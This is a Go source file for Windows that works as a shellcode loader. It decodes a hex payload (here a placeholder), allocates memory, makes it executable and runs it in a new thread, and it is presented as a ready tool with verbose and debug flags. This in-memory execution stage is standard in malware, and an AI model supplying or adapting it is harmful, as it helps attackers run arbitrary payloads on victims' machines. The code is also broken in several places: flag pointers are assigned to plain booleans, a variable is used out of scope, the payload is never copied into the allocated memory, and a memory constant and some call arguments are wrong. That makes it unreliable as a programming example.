package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	PAGE_EXECUTE_READ        = 0x20
	PAGE_READWRITE          = 0x20 | 0x1000
	MEM_COMMIT               = 0x1000
	MEM_RESERVE             = 0x2000
	MEM_ZERO_INIT           = 0x40
)
var (
	verboseOutput bool
	debugOutput  bool
)

func main() {
	verboseOutput = flag.Bool("verbose", false, "Enable verbose output")
	debugOutput  = flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	loadAndExecuteShellcode()
	if verboseOutput {
		fmt.Println("[-]Allocated", len(shellcode), "bytes")
	}
	if debugOutput {
		fmt.Println("[+]Shellcode Executed")
	}
}

func loadAndExecuteShellcode() {
	shellcode, err := hex.DecodeString("YourHexEncodedShellcodeHere")
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]Error decoding hex string: %s", err.Error()))
	}

	var oldProtect uint32
	var lpAddress uintptr

	if debugOutput {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if debugOutput {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
	}
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	if debugOutput {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}
	lpAddress, _, _ = VirtualAlloc.Call(0, uintptr(len(shellcode)), PAGE_READWRITE|MEM_COMMIT, MEM_RESERVE|MEM_ZERO_INIT)
	if lpAddress == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if verboseOutput {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if debugOutput {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
	}
	oldProtect, _, _ = VirtualProtect.Call(lpAddress, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if oldProtect == 0 {
		log.Fatal("[!]VirtualProtect failed and returned 0")
	}

	if verboseOutput {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if debugOutput {
		fmt.Println("[DEBUG]Calling CreateThread...")
	}
	thread, _, _ := CreateThread.Call(0, 0, lpAddress, uintptr(0), 0, 0)
	if thread == 0 {
		log.Fatal("[!]CreateThread failed and returned 0")
	}

	if verboseOutput {
		fmt.Println("[+]Shellcode Executed")
	}

	if debugOutput {
		fmt.Println("[DEBUG]Calling WaitForSingleObject...")
	}
	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}

func init() {
	rand.Seed(time.Now().UnixNano())
}